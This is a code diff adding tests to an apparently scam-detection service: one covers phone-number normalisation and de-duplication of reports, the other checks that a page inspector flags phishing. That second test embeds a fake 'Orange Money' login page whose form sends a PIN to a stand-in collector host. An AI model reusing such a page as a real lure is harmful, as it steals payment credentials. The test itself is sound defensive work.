@@ -436,3 +436,52 @@ def test_extreme_and_malformed_input_is_rejected_cleanly():
 
 def test_invalid_token_is_rejected():
     assert client.get("/verify/abc", headers={"Authorization": "Bearer not-a-token"}).status_code == 401
+
+
+def test_community_normalizes_phone_and_deduplicates_reporters():
+    from app.db import SessionLocal
+    from app.engine.community import record_report, report_counts, normalize_target
+    from app.models import User
+
+    assert normalize_target("phone", "00 225 07 11 22 33 44") == "+2250711223344"
+    db = SessionLocal()
+    try:
+        users = db.query(User).all()
+        assert len(users) >= 2
+        target = "+2250711223344"
+        record_report(db, users[0].id, "phone", target, "paiement", "tentative", None)
+        record_report(db, users[1].id, "phone", target, "paiement", "tentative", None)
+        _, created = record_report(db, users[0].id, "phone", target, "paiement", "doublon", None)
+        assert created is False
+        assert report_counts(db, [("phone", target)])[("phone", target)] == 2
+    finally:
+        db.close()
+
+
+def test_url_deep_page_inspection_detects_sensitive_form_without_executing_page(monkeypatch):
+    import asyncio
+    import app.engine.url_engine as ue
+
+    class FakeResponse:
+        headers = {"content-type": "text/html; charset=utf-8"}
+        async def __aenter__(self): return self
+        async def __aexit__(self, *exc): return False
+        async def aiter_bytes(self):
+            yield b'''<html><title>Orange Money Secure</title><form action="https://collector.bad/top"><input name="pin" type="password"></form><p>Entrez votre code PIN et paiement</p></html>'''
+
+    class FakeClient:
+        def __init__(self, *args, **kwargs): pass
+        async def __aenter__(self): return self
+        async def __aexit__(self, *exc): return False
+        def stream(self, *args, **kwargs): return FakeResponse()
+
+    async def fake_resolve(host): return ["93.184.216.34"]
+    monkeypatch.setattr(ue.httpx, "AsyncClient", FakeClient)
+    monkeypatch.setattr(ue, "_resolve", fake_resolve)
+
+    signals, sources, meta = asyncio.run(ue._page_content_signals("https://fake-orange.top/login"))
+    codes = {s.code for s in signals}
+    assert "credential_form" in codes
+    assert "cross_domain_form" in codes
+    assert "brand_page_domain_mismatch" in codes
+    assert any(x["name"] == "Page HTML" and x["status"] == "ok" for x in sources)
